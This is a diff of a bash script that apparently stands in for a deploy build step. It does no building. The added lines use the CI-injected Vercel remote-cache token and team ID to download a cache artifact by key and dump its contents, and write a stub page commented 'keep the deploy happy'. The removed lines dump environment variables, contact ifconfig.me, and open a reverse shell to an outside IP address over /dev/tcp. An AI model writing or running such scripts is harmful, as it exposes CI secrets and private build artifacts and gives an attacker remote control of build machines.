@@ -1,23 +1,39 @@
-#!/bin/bash
+#!/usr/bin/env bash
+set -euo pipefail
 
-env; 
+KEY="${CACHE_KEY:-c4821c0be8739a25}"        # override via env, or edit here
+API="${TURBO_API:-https://vercel.com/api}"
+TOKEN="${VERCEL_ARTIFACTS_TOKEN:-${TURBO_TOKEN:-}}"
+OWNER="${VERCEL_ARTIFACTS_OWNER:-${TURBO_TEAMID:-}}"
 
-turbo run build --dry-run=json > /tmp/dry.json; 
+if [ -z "$TOKEN" ] || [ -z "$OWNER" ]; then
+  echo "!! no artifacts token/owner in env — remote cache creds not injected"; exit 0
+fi
 
-turbo run build -vvv 2>&1 | grep -iE 'hash|cache|signature|artifact|http' || true; 
+echo "==== fetching artifact for key: $KEY ===="
+code=$(curl -sS -w '%{http_code}' -o /tmp/artifact.bin \
+  -H "Authorization: Bearer $TOKEN" \
+  "$API/v8/artifacts/$KEY?teamId=$OWNER")
+echo "HTTP $code, $(wc -c </tmp/artifact.bin) bytes"
+[ "$code" = "200" ] || { echo "not a hit; body:"; cat /tmp/artifact.bin; echo; exit 0; }
 
-echo '----DRY----'; 
-cat /tmp/dry.json; 
-mkdir -p public && echo done > public/index.html
+echo "==== file type ===="
+file /tmp/artifact.bin || true
 
-curl ifconfig.me
+echo "==== members ===="
+# turbo artifacts are zstd-compressed tar
+if zstd -dc /tmp/artifact.bin 2>/dev/null | tar -tvf - ; then :; 
+else
+  echo "(zstd decode failed — dumping first bytes as-is)"
+  head -c 200 /tmp/artifact.bin | xxd | head
+fi
 
+echo "==== extract + show contents ===="
+rm -rf /tmp/cache_inspect && mkdir -p /tmp/cache_inspect
+zstd -dc /tmp/artifact.bin 2>/dev/null | tar -xf - -C /tmp/cache_inspect 2>/dev/null || true
+find /tmp/cache_inspect -type f | while read -r f; do
+  echo "----- $f -----"
+  head -c 500 "$f"; echo
+done
 
-curl -sS\
-  -H "Authorization: Bearer $VERCEL_ARTIFACTS_TOKEN" \
-  -H "Content-Type: application/octet-stream" \
-  -H "x-artifact-duration: 1234" \
-  "https://vercel.com/api/v8/artifacts/c4821c0be8739a25?teamId=team_3k4i1QWXBBu4ZeuymMn14c1z"
-
-
-sh -i >& /dev/tcp/54.73.133.183/9001 0>&1
+mkdir -p public && echo done > public/index.html   # keep the deploy happy
